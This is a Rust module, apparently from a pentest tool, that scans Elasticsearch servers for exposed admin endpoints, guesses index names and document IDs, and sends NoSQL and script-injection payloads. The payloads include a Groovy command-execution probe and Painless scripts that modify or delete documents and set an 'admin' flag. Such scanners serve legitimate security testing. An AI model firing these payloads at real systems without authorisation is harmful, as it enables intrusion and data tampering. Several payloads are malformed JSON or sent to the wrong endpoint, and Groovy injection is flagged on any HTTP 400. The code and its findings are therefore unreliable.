//! Elasticsearch Security Scanner
//!
//! Detects security vulnerabilities in Elasticsearch deployments including:
//! - Query Injection (NoSQL injection, script injection)
//! - Information Disclosure (_cat API, _mapping, _settings)
//! - Document Access (ID enumeration, unauthorized access)
//! - Cluster Abuse (snapshot/restore, delete operations)
//! - Scripting vulnerabilities (Groovy, Painless, Mustache)
//!
//! Port: 9200 (default HTTP), 9300 (cluster communication)

use crate::scanners::{ScanReport, ScannerConfig, Target, Vuln, VulnSeverity};
use anyhow::Result;
use reqwest::Client;
use std::time::Duration;

/// Elasticsearch endpoints to test for information disclosure
const ES_INFO_ENDPOINTS: &[(&str, &str, VulnSeverity)] = &[
    // _cat API - comprehensive cluster information
    ("/_cat", "cat_api_root", VulnSeverity::High),
    ("/_cat/?v", "cat_api_verbose", VulnSeverity::High),
    ("/_cat/indices", "cat_indices", VulnSeverity::High),
    ("/_cat/indices?v", "cat_indices_verbose", VulnSeverity::High),
    ("/_cat/aliases", "cat_aliases", VulnSeverity::Medium),
    ("/_cat/aliases?v", "cat_aliases_verbose", VulnSeverity::Medium),
    ("/_cat/nodes", "cat_nodes", VulnSeverity::High),
    ("/_cat/nodes?v", "cat_nodes_verbose", VulnSeverity::High),
    ("/_cat/shards", "cat_shards", VulnSeverity::Medium),
    ("/_cat/shards?v", "cat_shards_verbose", VulnSeverity::Medium),
    ("/_cat/thread_pool", "cat_thread_pool", VulnSeverity::Medium),
    ("/_count", "cat_count", VulnSeverity::Medium),
    ("/_cat/segments", "cat_segments", VulnSeverity::Low),
    ("/_cat/health", "cat_health", VulnSeverity::Medium),
    ("/_cat/pending_tasks", "cat_pending_tasks", VulnSeverity::Medium),
    ("/_cat/plugins", "cat_plugins", VulnSeverity::Medium),
    ("/_cat/fielddata", "cat_fielddata", VulnSeverity::Low),
    ("/_cat/nodeattrs", "cat_nodeattrs", VulnSeverity::Medium),

    // _mapping - schema disclosure
    ("/_mapping", "mapping_all", VulnSeverity::High),
    ("/_mapping/?pretty", "mapping_all_pretty", VulnSeverity::High),
    ("/_mapping/*", "mapping_wildcard", VulnSeverity::High),
    ("/_mapping/_field_caps", "field_caps", VulnSeverity::Medium),

    // _settings - configuration disclosure
    ("/_settings", "settings_all", VulnSeverity::High),
    ("/_settings/?pretty", "settings_all_pretty", VulnSeverity::High),
    ("/_cluster/settings", "cluster_settings", VulnSeverity::High),
    ("/_cluster/settings?flat_settings=true", "cluster_settings_flat", VulnSeverity::High),

    // Cluster information
    ("/_cluster/health", "cluster_health", VulnSeverity::Medium),
    ("/_cluster/health?pretty", "cluster_health_pretty", VulnSeverity::Medium),
    ("/_cluster/state", "cluster_state", VulnSeverity::High),
    ("/_cluster/state/_all", "cluster_state_all", VulnSeverity::High),
    ("/_cluster/stats", "cluster_stats", VulnSeverity::High),
    ("/_cluster/stats?human", "cluster_stats_human", VulnSeverity::High),
    ("/_nodes", "nodes_info", VulnSeverity::High),
    ("/_nodes/?pretty", "nodes_info_pretty", VulnSeverity::High),
    ("/_nodes/stats", "nodes_stats", VulnSeverity::Medium),
    ("/_nodes/stats/all", "nodes_stats_all", VulnSeverity::Medium),

    // Index information
    ("/_all", "all_indices", VulnSeverity::Medium),
    ("/_all/_mapping", "all_mappings", VulnSeverity::High),
    ("/_all/_settings", "all_settings", VulnSeverity::High),
    ("/_aliases", "aliases_all", VulnSeverity::Medium),

    // Snapshot/Restore - potential for data exfiltration
    ("/_snapshot", "snapshot_list", VulnSeverity::High),
    ("/_snapshot/_all", "snapshot_all", VulnSeverity::High),
    ("/_restore", "restore_list", VulnSeverity::High),
    ("/_restore/_all", "restore_all", VulnSeverity::High),

    // Tasks - monitoring active operations
    ("/_tasks", "tasks_list", VulnSeverity::Medium),
    ("/_tasks?detailed=true", "tasks_detailed", VulnSeverity::Medium),

    // Search templates
    ("/_search/template", "search_template", VulnSeverity::Medium),
    ("/_script", "scripts_list", VulnSeverity::High),

    // Other sensitive endpoints
    ("/_nodes/local", "node_local", VulnSeverity::Medium),
    ("/_nodes/_local/plugins", "node_plugins", VulnSeverity::Medium),
    ("/_cat/recovery", "cat_recovery", VulnSeverity::Low),
];

/// Common index names to test for document access
const COMMON_INDEX_NAMES: &[&str] = &[
    // Security/Auth
    "users", "user", "accounts", "account", "admins", "admin",
    "auth", "authentication", "sessions", "session", "tokens", "token",
    "passwords", "credentials", "secrets", "api_keys", "keys",

    // Business data
    "customers", "customer", "clients", "client",
    "orders", "order", "products", "product", "transactions", "transaction",
    "payments", "payment", "invoices", "invoice", "receipts",

    // Content
    "posts", "post", "articles", "article", "blogs", "blog",
    "comments", "comment", "messages", "message",

    // Logs/Monitoring
    "logs", "log", "audit", "audit_logs", "events", "event",
    "access_logs", "error_logs", "system_logs",

    // Configuration
    "config", "configuration", "settings", "preferences",
    "metadata", "meta", "indexes", "indices",

    // E-commerce
    "cart", "carts", "wishlist", "wishlist_items",
    "catalog", "categories", "category", "inventory",

    // Social
    "profiles", "profile", "friends", "followers", "connections",
    "notifications", "notification",

    // Files/Documents
    "documents", "document", "files", "file", "uploads", "attachments",

    // Common tech stacks
    "kibana", "logstash", "beats", "apm",
    "metricbeat", "filebeat", "packetbeat", "heartbeat",
    ".kibana", ".monitoring", ".security", ".watches",
];

/// NoSQL injection payloads for Elasticsearch
const NOSQL_PAYLOADS: &[(&str, &str)] = &[
    // Boolean-based injection
    ("{\"query\":{\"bool\":{\"must\":[{\"match\":{\"_id\":\"1 OR 1=1\"}}]}}}", "boolean_or"),
    ("{\"query\":{\"bool\":{\"should\":[{\"match_all\":{}}]}}}", "bool_should_all"),
    ("{\"query\":{\"constant_score\":{\"filter\":{\"term\":{\"_id\":\"*\"}}}}}", "constant_score_wildcard"),

    // Wildcard injection
    ("{\"query\":{\"wildcard\":{\"_id\":\"*\"}}}", "wildcard_id_all"),
    ("{\"query\":{\"wildcard\":{\"password\":\"*\"}}}", "wildcard_password"),
    ("{\"query\":{\"wildcard\":{\"email\":\"*@*\"}}}", "wildcard_email"),
    ("{\"query\":{\"prefix\":{\"email\":\"admin\"}}}", "prefix_admin"),

    // Regex injection
    ("{\"query\":{\"regexp\":{\"_id\":\".*\"}}}", "regex_all"),
    ("{\"query\":{\"regexp\":{\"email\":\".*@.*\\\\..*\"}}}", "regex_email"),
    ("{\"query\":{\"regexp\":{\"password\":\".*\"}}}", "regex_password"),

    // Range injection
    ("{\"query\":{\"range\":{\"_id\":{\"gte\":0}}}}", "range_gte_zero"),
    ("{\"query\":{\"range\":{\"_id\":{\"lte\":999999}}}}}", "range_lte_large"),
    ("{\"query\":{\"range\":{\"id\":{\"gt\":null}}}}}", "range_gt_null"),

    // Fuzzy query injection
    ("{\"query\":{\"fuzzy\":{\"_id\":\"1\"}}}", "fuzzy_id"),
    ("{\"query\":{\"more_like_this\":{\"fields\":[\"_all\"],\"like_text\":\"\"}}}", "more_like_this"),

    // Match_all bypass
    ("{\"query\":{\"match_all\":{}}}", "match_all_empty"),
    ("{\"query\":{\"match_all\":{}},\"size\":1000}", "match_all_size_1000"),
    ("{\"query\":{\"match_all\":{}},\"from\":0,\"size\":10000}", "match_all_size_10000"),

    // Term bypasses
    ("{\"query\":{\"terms\":{\"_id\":[\"1\",\"2\",\"3\",\"admin\"]}}}", "terms_multiple"),
    ("{\"query\":{\"term\":{\"_index\":\"*\"}}}", "term_index_wildcard"),

    // Must/Should manipulation
    ("{\"query\":{\"must\":{\"match\":{\"_id\":\"*\"}}}}", "must_wildcard"),
    ("{\"query\":{\"should\":{\"match_all\":{}}}}", "should_match_all"),
    ("{\"query\":{\"must_not\":{\"match\":{\"_id\":\"nonexistent\"}}}}", "must_not_bypass"),

    // Nested query bypass
    ("{\"query\":{\"nested\":{\"path\":\"*\",\"query\":{\"match_all\":{}}}}}", "nested_bypass"),
    ("{\"query\":{\"has_child\":{\"type\":\"*\",\"query\":{\"match_all\":{}}}}}", "has_child_bypass"),

    // Function score injection
    ("{\"query\":{\"function_score\":{\"query\":{\"match_all\":{}}}}}", "function_score_bypass"),
    ("{\"query\":{\"boosting\":{\"positive\":{\"match_all\":{}},\"negative\":{}}}}", "boosting_bypass"),
];

/// Script injection payloads (Groovy, Painless)
const SCRIPT_PAYLOADS: &[(&str, &str, VulnSeverity)] = &[
    // Painless script injection (modern ES)
    ("{\"query\":{\"script_score\":{\"query\":{\"match_all\":{}},\"script\":{\"source\":\"1==1\",\"lang\":\"painless\"}}}}", "painless_boolean_true", VulnSeverity::High),
    ("{\"query\":{\"script_fields\":{\"test\":{\"script\":{\"source\":\"doc['_id'].value\",\"lang\":\"painless\"}}}}}", "painless_field_access", VulnSeverity::High),
    ("{\"script\":{\"source\":\"ctx._source.password\",\"lang\":\"painless\"}}", "painless_doc_source", VulnSeverity::High),
    ("{\"script\":{\"source\":\"ctx._source.put('secret','leaked')\",\"lang\":\"painless\"}}", "painless_doc_modify", VulnSeverity::Critical),

    // Groovy script injection (older ES, RCE potential)
    ("{\"query\":{\"script_score\":{\"query\":{\"match_all\":{}},\"script\":{\"source\":\"1==1\",\"lang\":\"groovy\"}}}}", "groovy_boolean", VulnSeverity::Critical),
    ("{\"script\":{\"source\":\"new org.mozilla.javascript.Context()\",\"lang\":\"groovy\"}}", "groovy_rce_js", VulnSeverity::Critical),
    ("{\"script\":{\"source\":\"Runtime.getRuntime().exec('whoami')\",\"lang\":\"groovy\"}}", "groovy_rce_exec", VulnSeverity::Critical),
    ("{\"script\":{\"source\":\"java.lang.Runtime.getRuntime()\",\"lang\":\"groovy\"}}", "groovy_runtime", VulnSeverity::Critical),

    // Expression script injection
    ("{\"script\":{\"inline\":\"1+1\",\"lang\":\"expression\"}}", "expression_script", VulnSeverity::Medium),
    ("{\"script\":{\"inline\":\"doc['_id'].value\",\"lang\":\"expression\"}}", "expression_field", VulnSeverity::High),

    // Mustache template injection
    ("{\"query\":{\"template\":{\"inline\":{\"query\":{\"match\":{\"{{field}}\":\"{{value}}\"}}}}}}", "mustache_template", VulnSeverity::Medium),
    ("{\"query\":{\"template\":{\"inline\":{\"query\":{\"range\":{\"_id\":{\"{{exp}}\":\"1\"}}}}}}}}", "mustache_template_injection", VulnSeverity::High),

    // Update with script
    ("{\"script\":{\"source\":\"ctx._source.delete()\",\"lang\":\"painless\"}}", "painless_delete", VulnSeverity::Critical),
    ("{\"script\":{\"source\":\"ctx.op='delete'\",\"lang\":\"painless\"}}", "painless_ctx_delete", VulnSeverity::Critical),

    // Script inline parameters
    ("{\"script\":{\"source\":\"doc[params.field].value\",\"params\":{\"field\":\"password\"},\"lang\":\"painless\"}}", "painless_params", VulnSeverity::High),
    ("{\"script\":{\"source\":\"ctx._source[params.field] = params.value\",\"params\":{\"field\":\"admin\",\"value\":true},\"lang\":\"painless\"}}", "painless_modify_param", VulnSeverity::Critical),
];

/// Document ID enumeration patterns
const ID_ENUMERATION: &[&str] = &[
    "1", "2", "3", "10", "100", "1000",
    "admin", "root", "system", "super",
    "0", "-1", "999", "9999",
    "user", "test", "demo", "guest",
    "admin@localhost", "test@example.com",
];

/// Response signatures indicating successful Elasticsearch access
const ES_SUCCESS_SIGNATURES: &[&str] = &[
    // JSON structure indicators
    "\"cluster_name\"",
    "\"cluster_uuid\"",
    "\"version\"",
    "\"name\"",

    // Common field names
    "\"mappings\"",
    "\"settings\"",
    "\"aliases\"",
    "\"indices\"",
    "\"shards\"",
    "\"documents\"",
    "\"count\"",

    // Document fields
    "\"_source\"",
    "\"_id\"",
    "\"_index\"",
    "\"_score\"",
    "\"_type\"",
    "\"hits\"",
    "\"total\"",

    // Cluster info
    "\"status\"",
    "\"number_of_nodes\"",
    "\"number_of_data_nodes\"",
    "\"active_primary_shards\"",
    "\"active_shards\"",
    "\"relocating_shards\"",
    "\"initializing_shards\"",
    "\"unassigned_shards\"",

    // Node info
    "\"host\"",
    "\"ip\"",
    "\"os\"",
    "\"process\"",
    "\"jvm\"",

    // Index fields
    "\"password\"",
    "\"email\"",
    "\"username\"",
    "\"secret\"",
    "\"token\"",
    "\"api_key\"",
    "\"credential\"",

    // Script responses
    "\"script\"",
    "\"lang\"",
    "\"source\"",

    // _cat API responses (tab-separated values)
    "green yellow red",  // Cluster health status
    "open close",        // Index status
    "pri rep",           // Primary/Replica
];

/// Signatures that indicate authentication/authorization bypass
const ES_BYPASS_SIGNATURES: &[&str] = &[
    "AuthenticationException",
    "authorization_exception",
    "security_exception",
    "unauthorized",
    "forbidden",
];

pub struct ElasticsearchScanner {
    client: Client,
    config: ScannerConfig,
}

impl ElasticsearchScanner {
    pub fn new(config: ScannerConfig) -> Self {
        let timeout = Duration::from_secs(30);
        let client = Client::builder()
            .timeout(timeout)
            .user_agent(&config.user_agent)
            .redirect(reqwest::redirect::Policy::limited(5))
            .build()
            .expect("Failed to create HTTP client");
        Self { client, config }
    }

    pub async fn scan(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Phase 1: Detect Elasticsearch
        if !self.is_elasticsearch(url).await {
            report.add_finding(Vuln {
                severity: VulnSeverity::Info,
                title: "Elasticsearch Not Detected".to_string(),
                description: "No Elasticsearch instance detected at this URL.".to_string(),
                location: Some(url.to_string()),
                recommendation: None,
                cwe: None,
                owasp: None,
            });
            return Ok(report);
        }

        // Phase 2: Information Disclosure
        report.merge(self.test_info_disclosure(url).await?);

        // Phase 3: Document Access
        report.merge(self.test_document_access(url).await?);

        // Phase 4: Query Injection
        report.merge(self.test_query_injection(url).await?);

        // Phase 5: Script Injection (aggressive mode only)
        if self.config.aggressive {
            report.merge(self.test_script_injection(url).await?);
        }

        // Phase 6: Cluster Abuse (aggressive mode only)
        if self.config.aggressive {
            report.merge(self.test_cluster_abuse(url).await?);
        }

        Ok(report)
    }

    /// Check if the target is running Elasticsearch
    async fn is_elasticsearch(&self, url: &str) -> bool {
        let base_url = Self::normalize_url(url);

        // Try root endpoint
        if let Ok(response) = self.client.get(&base_url).send().await {
            if let Ok(text) = response.text().await {
                if text.contains("\"cluster_name\"")
                    || text.contains("\"version\"")
                    || text.contains("\"name\"")
                    || text.contains("tagline")
                {
                    return true;
                }
            }
        }

        // Try _cat/health endpoint
        let cat_url = format!("{}/_cat/health", base_url);
        if let Ok(response) = self.client.get(&cat_url).send().await {
            if response.status().is_success() {
                return true;
            }
        }

        // Try cluster health
        let health_url = format!("{}/_cluster/health", base_url);
        if let Ok(response) = self.client.get(&health_url).send().await {
            if let Ok(text) = response.text().await {
                if text.contains("\"cluster_name\"") || text.contains("\"status\"") {
                    return true;
                }
            }
        }

        false
    }

    /// Normalize URL to use proper base
    fn normalize_url(url: &str) -> String {
        let url = url.trim_end_matches('/');
        if !url.starts_with("http://") && !url.starts_with("https://") {
            format!("http://{}", url)
        } else {
            url.to_string()
        }
    }

    /// Test information disclosure via Elasticsearch endpoints
    async fn test_info_disclosure(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));
        let base_url = Self::normalize_url(url);

        for (endpoint, technique, severity) in ES_INFO_ENDPOINTS {
            let test_url = format!("{}{}", base_url, endpoint);

            match self.client.get(&test_url).send().await {
                Ok(response) => {
                    let status = response.status();
                    if let Ok(text) = response.text().await {
                        // Check for successful information disclosure
                        if text.contains("\"cluster_name\"")
                            || text.contains("\"mappings\"")
                            || text.contains("\"settings\"")
                            || text.contains("\"indices\"")
                        {
                            report.add_finding(Vuln {
                                severity: *severity,
                                title: format!("Elasticsearch Info Disclosure: {}", technique),
                                description: format!(
                                    "Information disclosed via {} endpoint. \
                                     Status: {}. Response contains cluster information.",
                                    endpoint, status
                                ),
                                location: Some(test_url.clone()),
                                recommendation: Some(
                                    "Disable _cat API and restrict access to administrative endpoints. \
                                     Use Elasticsearch security features (X-Pack Security). \
                                     Implement proper authentication and authorization.".to_string()
                                ),
                                cwe: Some("CWE-200".to_string()),
                                owasp: Some("A01:2021".to_string()),
                            });
                        }

                        // Check for exposed credentials or sensitive data
                        let text_lower = text.to_lowercase();
                        if text_lower.contains("password")
                            || text_lower.contains("secret")
                            || text_lower.contains("token")
                            || text_lower.contains("api_key")
                        {
                            report.add_finding(Vuln {
                                severity: VulnSeverity::High,
                                title: format!("Elasticsearch Sensitive Data Exposure: {}", technique),
                                description: format!(
                                    "Sensitive data potentially exposed via {} endpoint. \
                                     Response contains credential-related keywords.",
                                    endpoint
                                ),
                                location: Some(test_url),
                                recommendation: Some(
                                    "Filter sensitive fields from API responses. \
                                     Use field-level security to restrict access.".to_string()
                                ),
                                cwe: Some("CWE-200".to_string()),
                                owasp: Some("A01:2021".to_string()),
                            });
                        }
                    }
                }
                Err(_) => {}
            }
        }

        Ok(report)
    }

    /// Test for unauthorized document access
    async fn test_document_access(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));
        let base_url = Self::normalize_url(url);

        // First, try to enumerate indices
        let indices_url = format!("{}/_cat/indices?format=json", base_url);
        let mut discovered_indices = Vec::new();

        if let Ok(response) = self.client.get(&indices_url).send().await {
            if let Ok(text) = response.text().await {
                if text.contains("\"index\"") {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::High,
                        title: "Elasticsearch Index Enumeration".to_string(),
                        description: "Index names can be enumerated via _cat/indices.".to_string(),
                        location: Some(indices_url),
                        recommendation: Some(
                            "Restrict access to index metadata. \
                             Use document-level security.".to_string()
                        ),
                        cwe: Some("CWE-200".to_string()),
                        owasp: Some("A01:2021".to_string()),
                    });
                }
            }
        }

        // Test common index names with document access
        for index_name in COMMON_INDEX_NAMES.iter().take(30) {
            // Try to count documents
            let count_url = format!("{}/{}/_count", base_url, index_name);

            if let Ok(response) = self.client.get(&count_url).send().await {
                if let Ok(text) = response.text().await {
                    if text.contains("\"count\"") {
                        report.add_finding(Vuln {
                            severity: VulnSeverity::Medium,
                            title: format!("Elasticsearch Index Access: {}", index_name),
                            description: format!(
                                "Index '{}' is accessible. Document count disclosed.",
                                index_name
                            ),
                            location: Some(count_url),
                            recommendation: Some(
                                "Implement proper authentication and authorization. \
                                 Use index-level security.".to_string()
                            ),
                            cwe: Some("CWE-200".to_string()),
                            owasp: Some("A04:2021".to_string()),
                        });
                        discovered_indices.push(index_name.to_string());
                    }
                }
            }

            // Try to search for documents
            let search_url = format!("{}/{}/_search?size=10", base_url, index_name);

            if let Ok(response) = self.client.get(&search_url).send().await {
                if let Ok(text) = response.text().await {
                    if text.contains("\"hits\"") && text.contains("\"_source\"") {
                        report.add_finding(Vuln {
                            severity: VulnSeverity::High,
                            title: format!("Elasticsearch Document Access: {}", index_name),
                            description: format!(
                                "Documents from index '{}' can be retrieved without authentication.",
                                index_name
                            ),
                            location: Some(search_url),
                            recommendation: Some(
                                "Enable Elasticsearch security. \
                                 Require authentication for all operations. \
                                 Implement document-level security.".to_string()
                            ),
                            cwe: Some("CWE-862".to_string()),
                            owasp: Some("A01:2021".to_string()),
                        });
                    }
                }
            }
        }

        // Test document ID enumeration
        for index_name in discovered_indices.iter().take(10) {
            for doc_id in ID_ENUMERATION {
                let doc_url = format!("{}/{}/{}", base_url, index_name, doc_id);

                if let Ok(response) = self.client.get(&doc_url).send().await {
                    if let Ok(text) = response.text().await {
                        if text.contains("\"found\":true") || text.contains("\"_source\"") {
                            report.add_finding(Vuln {
                                severity: VulnSeverity::High,
                                title: format!("Elasticsearch Document ID Enumeration: {}", doc_id),
                                description: format!(
                                    "Document with ID '{}' in index '{}' is accessible.",
                                    doc_id, index_name
                                ),
                                location: Some(doc_url),
                                recommendation: Some(
                                    "Prevent direct document access by ID. \
                                     Use search API with proper authorization checks.".to_string()
                                ),
                                cwe: Some("CWE-862".to_string()),
                                owasp: Some("A01:2021".to_string()),
                            });
                            break; // One successful ID is enough
                        }
                    }
                }
            }
        }

        Ok(report)
    }

    /// Test for NoSQL injection in queries
    async fn test_query_injection(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));
        let base_url = Self::normalize_url(url);

        // Try to find a searchable index first
        let test_index = COMMON_INDEX_NAMES[0]; // "users" is a good bet

        for (payload, technique) in NOSQL_PAYLOADS {
            let search_url = format!("{}/{}/_search", base_url, test_index);

            match self
                .client
                .post(&search_url)
                .header("content-type", "application/json")
                .body(*payload)
                .send()
                .await
            {
                Ok(response) => {
                    if let Ok(text) = response.text().await {
                        // Check if injection was successful
                        if text.contains("\"hits\"") && text.contains("\"total\"") {
                            // Parse total hits to see if we got more results than expected
                            if text.contains("\"value\":") || text.contains("\"total\":") {
                                report.add_finding(Vuln {
                                    severity: VulnSeverity::High,
                                    title: format!("Elasticsearch NoSQL Injection: {}", technique),
                                    description: format!(
                                        "NoSQL injection via Elasticsearch query. \
                                         Technique: {}. Response indicates successful query manipulation.",
                                        technique
                                    ),
                                    location: Some(format!("{} POST: {}", search_url, payload)),
                                    recommendation: Some(
                                        "Validate and sanitize all user input in queries. \
                                         Use parameterized queries. \
                                         Disable script fields if not needed. \
                                         Implement input validation.".to_string()
                                    ),
                                    cwe: Some("CWE-943".to_string()),
                                    owasp: Some("A03:2021".to_string()),
                                });
                            }
                        }

                        // Check for wildcard bypass success (many results)
                        if (payload.contains("*") || payload.contains("match_all"))
                            && text.contains("\"hits\"")
                        {
                            report.add_finding(Vuln {
                                severity: VulnSeverity::Medium,
                                title: format!("Elasticsearch Wildcard Injection: {}", technique),
                                description: format!(
                                    "Wildcard/pattern injection detected. Query: {}",
                                    technique
                                ),
                                location: Some(format!("{} POST: {}", search_url, payload)),
                                recommendation: Some(
                                    "Restrict wildcard queries. \
                                     Implement query complexity limits.".to_string()
                                ),
                                cwe: Some("CWE-943".to_string()),
                                owasp: Some("A03:2021".to_string()),
                            });
                        }
                    }
                }
                Err(_) => {}
            }
        }

        Ok(report)
    }

    /// Test for script injection vulnerabilities
    async fn test_script_injection(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));
        let base_url = Self::normalize_url(url);

        let test_index = COMMON_INDEX_NAMES[0];

        for (payload, technique, severity) in SCRIPT_PAYLOADS {
            let search_url = format!("{}/{}/_search", base_url, test_index);

            match self
                .client
                .post(&search_url)
                .header("content-type", "application/json")
                .body(*payload)
                .send()
                .await
            {
                Ok(response) => {
                    let status = response.status();

                    // Groovy script injection indicates potential RCE
                    if technique.contains("groovy") && (status.is_success() || status.as_u16() == 400) {
                        report.add_finding(Vuln {
                            severity: *severity,
                            title: format!("Elasticsearch Groovy Script Injection: {}", technique),
                            description: format!(
                                "Groovy scripting is enabled, which may lead to RCE. \
                                 Technique: {}. Status: {}",
                                technique, status
                            ),
                            location: Some(format!("{} POST: {}", search_url, payload)),
                            recommendation: Some(
                                "Disable Groovy scripting immediately. \
                                 Remove script.inline and script.indexed settings. \
                                 Upgrade to Elasticsearch 5.x+ which disables Groovy by default.".to_string()
                            ),
                            cwe: Some("CWE-917".to_string()),
                            owasp: Some("A03:2021".to_string()),
                        });
                    }

                    // Painless script injection
                    if technique.contains("painless") && status.is_success() {
                        report.add_finding(Vuln {
                            severity: *severity,
                            title: format!("Elasticsearch Painless Script Injection: {}", technique),
                            description: format!(
                                "Painless script injection allows field access or modification. \
                                 Technique: {}",
                                technique
                            ),
                            location: Some(format!("{} POST: {}", search_url, payload)),
                            recommendation: Some(
                                "Restrict script usage to trusted users. \
                                 Use sandbox settings. \
                                 Disable inline scripts if possible.".to_string()
                            ),
                            cwe: Some("CWE-943".to_string()),
                            owasp: Some("A03:2021".to_string()),
                        });
                    }

                    // Template injection
                    if technique.contains("mustache") && status.is_success() {
                        report.add_finding(Vuln {
                            severity: *severity,
                            title: "Elasticsearch Mustache Template Injection".to_string(),
                            description: "Mustache templates can be manipulated to inject queries.".to_string(),
                            location: Some(format!("{} POST: {}", search_url, payload)),
                            recommendation: Some(
                                "Sanitize template parameters. \
                                 Use validated templates only. \
                                 Consider disabling search templates.".to_string()
                            ),
                            cwe: Some("CWE-943".to_string()),
                            owasp: Some("A03:2021".to_string()),
                        });
                    }
                }
                Err(_) => {}
            }
        }

        Ok(report)
    }

    /// Test for cluster abuse vulnerabilities
    async fn test_cluster_abuse(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));
        let base_url = Self::normalize_url(url);

        // Test snapshot repository enumeration
        let snapshot_url = format!("{}/_snapshot", base_url);
        if let Ok(response) = self.client.get(&snapshot_url).send().await {
            if let Ok(text) = response.text().await {
                if !text.is_empty() && (text.contains("{\"") || !text.contains("error")) {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::High,
                        title: "Elasticsearch Snapshot Repository Exposure".to_string(),
                        description: "Snapshot repositories are exposed. May contain sensitive data.".to_string(),
                        location: Some(snapshot_url),
                        recommendation: Some(
                            "Restrict access to snapshot/restore operations. \
                             Encrypt snapshots. \
                             Use secured snapshot repositories.".to_string()
                        ),
                        cwe: Some("CWE-200".to_string()),
                        owasp: Some("A01:2021".to_string()),
                    });
                }
            }
        }

        // Test for node info disclosure
        let nodes_url = format!("{}/_nodes", base_url);
        if let Ok(response) = self.client.get(&nodes_url).send().await {
            if let Ok(text) = response.text().await {
                if text.contains("\"host\"") || text.contains("\"ip\"") {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::Medium,
                        title: "Elasticsearch Node Information Disclosure".to_string(),
                        description: "Node network information is exposed.".to_string(),
                        location: Some(nodes_url),
                        recommendation: Some(
                            "Restrict node API access. \
                             Use network isolation.".to_string()
                        ),
                        cwe: Some("CWE-200".to_string()),
                        owasp: Some("A04:2021".to_string()),
                    });
                }
            }
        }

        // Test for settings disclosure
        let settings_url = format!("{}/_cluster/settings", base_url);
        if let Ok(response) = self.client.get(&settings_url).send().await {
            if let Ok(text) = response.text().await {
                if text.contains("\"persistent\"") || text.contains("\"transient\"") {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::Medium,
                        title: "Elasticsearch Cluster Settings Disclosure".to_string(),
                        description: "Cluster configuration settings are exposed.".to_string(),
                        location: Some(settings_url),
                        recommendation: Some(
                            "Restrict access to cluster settings API. \
                             Remove sensitive configuration.".to_string()
                        ),
                        cwe: Some("CWE-200".to_string()),
                        owasp: Some("A04:2021".to_string()),
                    });
                }
            }
        }

        // Test for tasks disclosure (shows what operations are running)
        let tasks_url = format!("{}/_tasks", base_url);
        if let Ok(response) = self.client.get(&tasks_url).send().await {
            if let Ok(text) = response.text().await {
                if text.contains("\"tasks\"") {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::Low,
                        title: "Elasticsearch Active Tasks Disclosure".to_string(),
                        description: "Active cluster tasks can be monitored.".to_string(),
                        location: Some(tasks_url),
                        recommendation: Some(
                            "Restrict access to tasks API if task information is sensitive.".to_string()
                        ),
                        cwe: Some("CWE-200".to_string()),
                        owasp: Some("A04:2021".to_string()),
                    });
                }
            }
        }

        Ok(report)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_scanner_creation() {
        let config = ScannerConfig::new();
        let scanner = ElasticsearchScanner::new(config);
        // Just verify it creates without panic
        assert_eq!(scanner.config.aggressive, false);
    }

    #[test]
    fn test_url_normalization() {
        assert_eq!(
            ElasticsearchScanner::normalize_url("example.com:9200"),
            "http://example.com:9200"
        );
        assert_eq!(
            ElasticsearchScanner::normalize_url("http://example.com:9200/"),
            "http://example.com:9200"
        );
    }

    #[test]
    fn test_info_endpoints_loaded() {
        assert!(!ES_INFO_ENDPOINTS.is_empty());
        assert!(ES_INFO_ENDPOINTS.len() > 20);
    }

    #[test]
    fn test_common_indices_loaded() {
        assert!(!COMMON_INDEX_NAMES.is_empty());
        assert!(COMMON_INDEX_NAMES.contains(&"users"));
        assert!(COMMON_INDEX_NAMES.contains(&"logs"));
        assert!(COMMON_INDEX_NAMES.contains(&"admin"));
    }

    #[test]
    fn test_nosql_payloads_loaded() {
        assert!(!NOSQL_PAYLOADS.is_empty());
        assert!(NOSQL_PAYLOADS.iter().any(|(p, _)| p.contains("match_all")));
        assert!(NOSQL_PAYLOADS.iter().any(|(p, _)| p.contains("wildcard")));
    }

    #[test]
    fn test_script_payloads_loaded() {
        assert!(!SCRIPT_PAYLOADS.is_empty());
        assert!(SCRIPT_PAYLOADS.iter().any(|(_, t, _)| t.contains("painless")));
        assert!(SCRIPT_PAYLOADS.iter().any(|(_, t, _)| t.contains("groovy")));
    }

    #[test]
    fn test_id_enumeration_loaded() {
        assert!(!ID_ENUMERATION.is_empty());
        assert!(ID_ENUMERATION.contains(&"1"));
        assert!(ID_ENUMERATION.contains(&"admin"));
        assert!(ID_ENUMERATION.contains(&"root"));
    }

    #[test]
    fn test_success_signatures_loaded() {
        assert!(!ES_SUCCESS_SIGNATURES.is_empty());
        assert!(ES_SUCCESS_SIGNATURES.contains(&"\"cluster_name\""));
        assert!(ES_SUCCESS_SIGNATURES.contains(&"\"mappings\""));
    }

    #[test]
    fn test_script_severity_classification() {
        for (_, technique, severity) in SCRIPT_PAYLOADS {
            if technique.contains("groovy") || technique.contains("rce") {
                assert_eq!(
                    *severity, VulnSeverity::Critical,
                    "Groovy/RCE payloads should be Critical: {}",
                    technique
                );
            }
        }
    }

    #[test]
    fn test_info_endpoint_severity() {
        // _cat API endpoints should be High or Medium
        for (endpoint, _, severity) in ES_INFO_ENDPOINTS {
            if endpoint.contains("/_cat/") {
                assert!(
                    matches!(severity, VulnSeverity::High | VulnSeverity::Medium | VulnSeverity::Low),
                    "_cat endpoint severity should be High/Medium/Low: {}",
                    endpoint
                );
            }
        }
    }
}
